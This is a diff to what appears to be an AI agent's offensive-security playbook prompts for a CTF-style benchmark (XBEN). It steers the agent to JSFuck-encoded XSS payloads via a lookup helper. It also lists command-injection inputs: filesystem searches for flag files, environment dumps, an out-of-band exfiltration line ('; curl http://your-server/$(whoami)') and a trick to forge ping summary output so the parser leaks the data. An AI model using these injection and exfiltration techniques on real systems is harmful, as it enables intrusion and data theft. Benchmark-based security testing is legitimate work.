@@ -101,7 +101,10 @@ If basic payloads are blocked, try these bypasses IN ORDER:
 - \${alert(1)} (template literals)
 
 ### Step 5: JSFuck for Letter/Digit Filters (XBEN-010 vector)
-When the target's input filter strips letters or digits (alphanumerics) but still allows \`[]()!+\` through, payloads need to be encoded in JSFuck — a JavaScript-only-using-six-characters technique where every JS expression can be expressed using only \`[]()!+\`. Use the precomputed \`JSFUCK_ALERT_PAYLOAD\` constant exported from \`./payloads.ts\` (import it in agent code) and drop it directly into the injection point. Don't try to hand-encode JSFuck under turn pressure — the precomputed payload demonstrates JS execution and is enough to win. This is the XBEN-010 vector.
+When the target's input filter strips letters or digits (alphanumerics) but still allows \`[]()!+\` through, payloads need to be encoded in JSFuck — a JavaScript-only-using-six-characters technique where every JS expression can be expressed using only \`[]()!+\`.
+- Call \`payload_lookup\` with \`name="jsfuck_xss"\` when the challenge or checker expects the exact text \`XSS\`.
+- Call \`payload_lookup\` with \`name="jsfuck_alert"\` when any alert execution proof is enough.
+- Do not try to hand-encode JSFuck under turn pressure; use the payload helper and focus on the escape context around it.
 
 ### Step 6: Confirm and Save
 - Every XSS MUST be confirmed via the browser tool dialogs array before saving
@@ -352,7 +355,8 @@ Once you have RCE (even blind), immediately try:
 - If semicolons blocked: try || id, && id, newline injection (%0a)
 - Find and read flags: ; find / -name 'flag*' 2>/dev/null
 - Check env vars: ; env | grep -i flag
-- Try out-of-band: ; curl http://your-server/$(whoami)`,
+- Try out-of-band: ; curl http://your-server/$(whoami)
+- If the endpoint parses command output into a summary (e.g. ping wrappers), shape the injected output to the parser instead of expecting raw stdout to be preserved. Example pattern: emit a fake summary line such as \`VALUE packets transmitted, 1 received, 0% packet loss\` so the parser carries your exfiltrated VALUE through.`,
 
   deserialization: `## Deserialization Playbook
 Covers PHP, Python pickle, Ruby Marshal, Java, .NET, and YAML deserialization.
